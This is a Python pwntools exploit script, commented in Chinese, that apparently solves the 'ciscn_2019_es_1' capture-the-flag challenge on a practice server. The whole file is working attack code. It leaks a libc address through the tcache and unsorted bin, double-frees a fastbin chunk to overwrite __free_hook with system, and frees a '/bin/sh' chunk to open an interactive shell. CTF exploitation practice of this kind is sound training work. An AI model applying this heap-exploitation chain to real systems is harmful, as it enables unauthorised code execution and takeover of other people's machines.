from pwn import *
from LibcSearcher import LibcSearcher
import sys

io = -1
############################
#********修改文件名**********
############################
file_name = 'ciscn_2019_es_1'
port = 27974

###########修改宏###########
DEBUG = 1
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if len(sys.argv) > 1 and sys.argv[1].isdigit():
    io = remote('node3.buuoj.cn', int(sys.argv[1]))
    DEBUG = False
    def STOP(*args):
        pass
elif DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    def STOP(idx:str = 0):
        input('stop{} ===> {}'.format(idx, proc.pidof(io)))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80485FC\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)
    DEBUG = False
    def STOP(*args):
        pass

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libc))

##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
context.update(os='linux', arch='amd64', log_level='debug', endian='little')

'''
fastbin attack // double free
'''
def add(size:int, name:bytes=b'\x00', call:bytes=b'a'*0xc):
    global io
    io.sendlineafter("choice:", '1')
    io.sendlineafter("Please input the size of compary's name\n", str(size))
    io.sendafter("please input name:\n", name)
    io.sendafter("please input compary call:\n", call)
    io.recvuntil("Done!\n")

def show(idx:int):
    global io
    io.sendlineafter("choice:", '2')
    io.sendlineafter("Please input the index:\n", str(idx))
    io.recvuntil('name:\n')
    name = io.recvline()
    io.recvuntil('phone:\n')
    phone = io.recvline()
    io.recvuntil("Done!\n")
    return name, phone

def call(idx:int):
    global io
    io.sendlineafter("choice:", '3')
    io.sendlineafter("Please input the index:\n", str(idx))
    io.recvuntil("Done\n")


add(0x80)
add(0x80)
add(0x60)
add(0x60)
add(0x18, b'/bin/sh\x00')

for x in range(7):
    call(0)
call(1)

leak_addr, _ = show(1)
print(leak_addr)

leak_addr = u64(leak_addr[:6].ljust(8, b'\x00'))

main_arena_addr = leak_addr - 96
libc_base_addr = leak_addr - 0x3ebca0
system_addr = libc_base_addr + 0x4f440
free_hook_addr = libc_base_addr  + 0x3ed8e8

LOG_ADDR_SUCCESS('leak_addr', leak_addr)
LOG_ADDR_SUCCESS('libc_base_addr', libc_base_addr)
LOG_ADDR_SUCCESS('system_addr', system_addr)
LOG_ADDR_SUCCESS('free_hook_addr', free_hook_addr)

call(2)
call(3)
call(3)

add(0x60, p64(free_hook_addr))

add(0x60, p64(system_addr))
add(0x60, p64(system_addr))


io.sendlineafter("choice:", '3')
io.sendlineafter("Please input the index:\n", str(4))
io.interactive()
